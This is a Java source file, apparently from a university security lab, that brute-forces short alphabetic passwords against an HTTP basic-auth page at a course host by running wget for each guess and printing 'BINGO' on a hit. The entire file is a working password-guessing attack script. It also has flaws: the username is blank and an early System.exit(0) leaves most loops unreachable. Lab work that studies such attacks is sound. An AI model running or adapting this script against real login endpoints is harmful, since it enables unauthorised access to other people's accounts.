



import java.io.*;





class BruteForce{
	public static void main (String args[]){

		URLHack uh = new URLHack();

		String pas,pas1,pas2,pas3;
		String passs;

       

		for(int i = 97; i <= 122; i++)
		{
			for(int j = 97; j <=122; j++)
			{
				for(int k = 97; k <= 122; k++)
				{
				
				pas1 = new Character((char)i).toString();
				pas2 = new Character((char)j).toString();
				pas3 = new Character((char)k).toString();
				passs= pas1+pas2+pas3;
				uh.crackIt(passs);
				
				

				}
			}
		}
        System.exit(0);
        for(int i = 65; i <= 90; i++)
		{
			for(int j = 65; j <=90; j++)
			{
				for(int k = 65; k <= 90; k++)
				{
				pas1 = new Character((char)i).toString();
				pas2 = new Character((char)j).toString();
				pas3 = new Character((char)k).toString();
				passs= pas1+pas2+pas3;
				uh.crackIt(passs);
				
				

				}
			}
		}
		for(int i = 65; i <= 90; i++)
		{
			for(int j = 97; j <=122; j++)
			{
				for(int k = 65; k <= 90; k++)
				{
				pas1 = new Character((char)i).toString();
				pas2 = new Character((char)j).toString();
				pas3 = new Character((char)k).toString();
				passs= pas1+pas2+pas3;
				uh.crackIt(passs);
				
				

				}
			}
		}

		for(int i = 97; i <= 122; i++)
		{
			for(int j = 97; j <=122; j++)
			{
				for(int k = 65; k <= 90; k++)
				{
				pas1 = new Character((char)i).toString();
				pas2 = new Character((char)j).toString();
				pas3 = new Character((char)k).toString();
				passs= pas1+pas2+pas3;
				uh.crackIt(passs);
				
				

				}
			}
		}

		for(int i = 97; i <= 122; i++)
		{
			for(int j = 65; j <=90; j++)
			{
				for(int k = 65; k <= 90; k++)
				{
				pas1 = new Character((char)i).toString();
				pas2 = new Character((char)j).toString();
				pas3 = new Character((char)k).toString();
				passs= pas1+pas2+pas3;
				uh.crackIt(passs);
				
				

				}
			}
		}

		for(int i = 65; i <= 90; i++)
		{
			for(int j = 97; j <= 122; j++)
			{
				pas1 = new Character((char)i).toString();
				pas2 = new Character((char)j).toString();
				passs= pas1+pas2;
				uh.crackIt(passs);
			}
		}


	}

}

class URLHack{

public void crackIt(String paas){
		Process p=null;
		try{
			p = Runtime.getRuntime().exec("wget -nv --http-user= --http-passwd="+paas+
			" http://sec-crack.cs.rmit.edu./SEC/2/");
			


			InputStream is = p.getErrorStream();
			BufferedReader bf = new BufferedReader(new InputStreamReader(is));

			String tempLine="";
			tempLine = bf.readLine();
			System.out.println(tempLine);

			if(tempLine.length() == 21)
				System.out.println("Invalid Password " +paas);
			else
			{
				System.out.println("BINGO " + paas);
				System.exit(0);
			}


		}

		catch(Exception e){
			System.out.println(" ERROR "+e);



		}

}
}